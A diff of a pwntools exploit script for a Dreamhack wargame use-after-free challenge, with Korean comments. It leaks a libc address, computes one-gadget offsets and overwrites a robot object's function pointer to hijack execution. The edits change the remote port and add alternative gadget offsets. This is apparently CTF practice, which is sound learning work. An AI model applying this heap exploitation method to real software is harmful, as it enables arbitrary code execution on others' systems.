@@ -375,13 +375,14 @@ $1 = 0x3ebca0
 # Name: uaf_overwrite.py
 from pwn import *
 
-p = remote("host3.dreamhack.games", 11995)
+p = remote("host3.dreamhack.games", 18315)
 
 
 def human(weight, age):
     p.sendlineafter(b'>', b'1')
     p.sendlineafter(b': ', str(weight).encode())
     p.sendlineafter(b': ', str(age).encode())
+
     # p.sendline(str(weight).encode())
     # p.sendline(str(age).encode())
 
@@ -389,6 +390,7 @@ def human(weight, age):
 def robot(weight):
     p.sendlineafter(b'>', b'2')
     p.sendlineafter(b': ', str(weight).encode())
+
     # p.sendline(b'2')
     # p.sendline(str(weight).encode())
 
@@ -400,6 +402,7 @@ def custom(size, data, idx):
     # 만약 `sendline`으로 보내면 data에 `\n`이 추가되서 출력되는 `data` 값이 달라져서 offset도 달라짐
     p.sendafter(b': ', data)
     p.sendlineafter(b': ', str(idx).encode())
+
     # p.sendline(b'3')
     # p.sendline(str(size).encode())
     # p.send(p64(data))
@@ -418,6 +421,9 @@ custom(0x500, b'B', -1)
 
 libc_base = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x3ebc42
 og = libc_base + 0x10a41c  # 제약 조건을 만족하는 원가젯
+# og = libc_base + 0x4f3ce
+# og = libc_base + 0x4f3d5
+# og = libc_base + 0x4f432
 
 # [2] `robot->fptr` Overwrite
 human(1, og)
